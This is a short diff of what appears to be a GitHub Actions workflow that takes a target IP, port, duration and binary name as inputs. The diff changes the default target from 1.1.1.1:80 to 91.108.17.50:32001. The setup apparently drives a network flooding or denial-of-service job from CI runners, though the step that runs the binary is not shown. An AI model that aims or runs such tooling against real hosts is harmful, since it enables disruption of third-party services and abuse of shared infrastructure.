@@ -7,11 +7,11 @@ on:
       ip:
         description: 'Target IP'
         required: true
-        default: '1.1.1.1'
+        default: '91.108.17.50'
       port:
         description: 'Target Port'
         required: true
-        default: '80'
+        default: '32001'
       duration:
         description: 'Duration'
         required: true
@@ -36,8 +36,8 @@ jobs:
     steps:
       - name: Execute
         run: |
-          IP="${{ github.event.inputs.ip || '1.1.1.1' }}"
-          PORT="${{ github.event.inputs.port || '80' }}"
+          IP="${{ github.event.inputs.ip || '91.108.17.50' }}"
+          PORT="${{ github.event.inputs.port || '32001' }}"
           DUR="${{ github.event.inputs.duration || '60' }}"
           BIN="${{ github.event.inputs.bin || 'mustafa' }}"
           B=""
